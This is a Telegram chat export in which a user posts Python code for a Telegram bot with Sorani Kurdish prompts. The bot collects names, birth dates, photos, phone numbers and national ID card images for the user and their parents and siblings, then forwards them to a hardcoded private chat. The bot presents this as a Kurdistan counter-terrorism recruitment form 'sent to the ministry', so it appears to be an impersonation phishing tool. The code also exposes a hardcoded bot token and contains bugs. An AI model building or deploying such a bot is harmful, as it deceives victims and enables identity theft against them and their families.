Shka, [6/14/2025 7:29 PM]
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ConversationHandler, filters, ContextTypes
import os

BOT_TOKEN = "8150112450:AAEn87IxbVudO4Rw2htgYUDc015_EhNBAQA"
CHAT_ID = "6261645494"

# ئەم هەڵەکارەی خوارەوە شتێکە بۆ هەموو قۆناغەکان
(YOUR_NAME, YOUR_DOB, YOUR_LEVEL, YOUR_PHOTO, YOUR_PHONE, YOUR_CARD,
 FATHER_NAME, FATHER_DOB, FATHER_PHOTO, FATHER_PHONE, FATHER_CARD,
 MOTHER_NAME, MOTHER_DOB, MOTHER_PHOTO, MOTHER_PHONE, MOTHER_CARD,
 BROTHER_NAME, BROTHER_DOB, BROTHER_PHOTO, BROTHER_PHONE, BROTHER_CARD,
 SISTER_NAME, SISTER_DOB, SISTER_PHOTO, SISTER_PHONE, SISTER_CARD,
 END) = range(26)

form_data = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    form_data[update.effective_chat.id] = {}
    await update.message.reply_text("📛 ناوی سیانی خۆت:")
    return YOUR_NAME

async def collect_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text
    stage = context.user_data.get("stage", YOUR_NAME)

    fields = {
        YOUR_NAME: "your_name",
        YOUR_DOB: "your_dob",
        YOUR_LEVEL: "your_level",
        YOUR_PHONE: "your_phone",
        FATHER_NAME: "father_name",
        FATHER_DOB: "father_dob",
        FATHER_PHONE: "father_phone",
        MOTHER_NAME: "mother_name",
        MOTHER_DOB: "mother_dob",
        MOTHER_PHONE: "mother_phone",
        BROTHER_NAME: "brother_name",
        BROTHER_DOB: "brother_dob",
        BROTHER_PHONE: "brother_phone",
        SISTER_NAME: "sister_name",
        SISTER_DOB: "sister_dob",
        SISTER_PHONE: "sister_phone"
    }

    form_data[update.effective_chat.id][fields[stage]] = user_input

    prompts = {
        YOUR_NAME: ("📆 لەدایک بوون:", YOUR_DOB),
        YOUR_DOB: ("🎓 باڵا:", YOUR_LEVEL),
        YOUR_LEVEL: ("🖼️ ڕەسمێکی خۆت بار بکە:", YOUR_PHOTO),
        YOUR_PHONE: ("🪪 ڕەسمی کارتی نیشتیمانیەکەت بار بکە:", YOUR_CARD),
        YOUR_CARD: ("👨‍👧‍👦 ناوی سیانی باوک:", FATHER_NAME),
        FATHER_NAME: ("📅 لەدایک بوونی باوک:", FATHER_DOB),
        FATHER_DOB: ("🖼️ ڕەسمی باوک بار بکە:", FATHER_PHOTO),
        FATHER_PHONE: ("📞 ژمارە تەلەفۆنی باوک:", FATHER_CARD),
        FATHER_CARD: ("👩 ناوی سیانی دایک:", MOTHER_NAME),
        MOTHER_NAME: ("📅 لەدایک بوونی دایک:", MOTHER_DOB),
        MOTHER_DOB: ("🖼️ ڕەسمی دایک بار بکە:", MOTHER_PHOTO),
        MOTHER_PHONE: ("📞 ژمارە تەلەفۆنی دایک:", MOTHER_CARD),
        MOTHER_CARD: ("👦 ناوی سیانی برا (ئەگەر هەیە):", BROTHER_NAME),
        BROTHER_NAME: ("📅 لەدایک بوونی برا:", BROTHER_DOB),
        BROTHER_DOB: ("🖼️ ڕەسمی برا بار بکە:", BROTHER_PHOTO),
        BROTHER_PHONE: ("📞 ژمارە تەلەفۆنی برا:", BROTHER_CARD),
        BROTHER_CARD: ("👧 ناوی سیانی خوشک (ئەگەر هەیە):", SISTER_NAME),
        SISTER_NAME: ("📅 لەدایک بوونی خوشک:", SISTER_DOB),
        SISTER_DOB: ("🖼️ ڕەسمی خوشک بار بکە:", SISTER_PHOTO),
        SISTER_PHONE: ("📞 ژمارە تەلەفۆنی خوشک:", SISTER_CARD),
        SISTER_CARD: ("🪪 ڕەسمی کارتی خوشک:", END)
    }

    if stage in prompts:
        msg, next_stage = prompts[stage]
        await update.message.reply_text(msg)
        context.user_data["stage"] = next_stage
        return next_stage
    else:
        return await finish(update, context)

async def collect_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_file = update.message.document or update.message.photo[-1]
    chat_id = update.effective_chat.id

    await context.bot.send_document(chat_id=CHAT_ID, document=user_file.file_id)

    return await collect_text(update, context)

async def finish(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = "📋 فۆڕمی دامەزراندنی دژەتیرۆری کوردستان:\n"
    for k, v in form_data[update.effective_chat.id].items():
        msg += f"{k.replace('_', ' ').title()}: {v}\n"

    await context.bot.send_message(chat_id=CHAT_ID, text=msg)
    await update.message.reply_text("✅ نێردرا بۆ وەزارەت.")
    return ConversationHandler.END

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    conv = ConversationHandler(

Shka, [6/14/2025 7:29 PM]
entry_points=[CommandHandler("start", start)],
        states={
            YOUR_NAME: [MessageHandler(filters.TEXT, collect_text)],
            YOUR_DOB: [MessageHandler(filters.TEXT, collect_text)],
            YOUR_LEVEL: [MessageHandler(filters.TEXT, collect_text)],
            YOUR_PHOTO: [MessageHandler(filters.PHOTO | filters.Document.ALL, collect_file)],
            YOUR_PHONE: [MessageHandler(filters.TEXT, collect_text)],
            YOUR_CARD: [MessageHandler(filters.Document.ALL, collect_file)],

            FATHER_NAME: [MessageHandler(filters.TEXT, collect_text)],
            FATHER_DOB: [MessageHandler(filters.TEXT, collect_text)],
            FATHER_PHOTO: [MessageHandler(filters.PHOTO | filters.Document.ALL, collect_file)],
            FATHER_PHONE: [MessageHandler(filters.TEXT, collect_text)],
            FATHER_CARD: [MessageHandler(filters.Document.ALL, collect_file)],

            MOTHER_NAME: [MessageHandler(filters.TEXT, collect_text)],
            MOTHER_DOB: [MessageHandler(filters.TEXT, collect_text)],
            MOTHER_PHOTO: [MessageHandler(filters.PHOTO | filters.Document.ALL, collect_file)],
            MOTHER_PHONE: [MessageHandler(filters.TEXT, collect_text)],
            MOTHER_CARD: [MessageHandler(filters.Document.ALL, collect_file)],

            BROTHER_NAME: [MessageHandler(filters.TEXT, collect_text)],
            BROTHER_DOB: [MessageHandler(filters.TEXT, collect_text)],
            BROTHER_PHOTO: [MessageHandler(filters.PHOTO | filters.Document.ALL, collect_file)],
            BROTHER_PHONE: [MessageHandler(filters.TEXT, collect_text)],
            BROTHER_CARD: [MessageHandler(filters.Document.ALL, collect_file)],

            SISTER_NAME: [MessageHandler(filters.TEXT, collect_text)],
            SISTER_DOB: [MessageHandler(filters.TEXT, collect_text)],
            SISTER_PHOTO: [MessageHandler(filters.PHOTO | filters.Document.ALL, collect_file)],
            SISTER_PHONE: [MessageHandler(filters.TEXT, collect_text)],
            SISTER_CARD: [MessageHandler(filters.Document.ALL, collect_file)],
        },
        fallbacks=[]
    )

    app.add_handler(conv)
    app.run_polling()

if name == "__main__":
    main()